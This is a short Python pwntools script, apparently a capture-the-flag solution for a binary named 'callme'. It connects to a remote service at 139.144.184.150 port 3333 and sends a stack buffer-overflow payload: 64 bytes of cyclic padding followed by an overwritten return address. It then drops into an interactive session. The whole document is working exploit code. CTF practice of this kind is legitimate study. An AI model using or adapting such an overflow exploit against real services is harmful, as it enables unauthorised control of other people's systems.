from pwn import *
elf = ELF("./callme")
r = process("./callme")
r = remote("139.144.184.150", 3333)
# shellcode = 

payload = cyclic(64) + p32(0x0804875e)
r.sendline(payload)
r.interactive()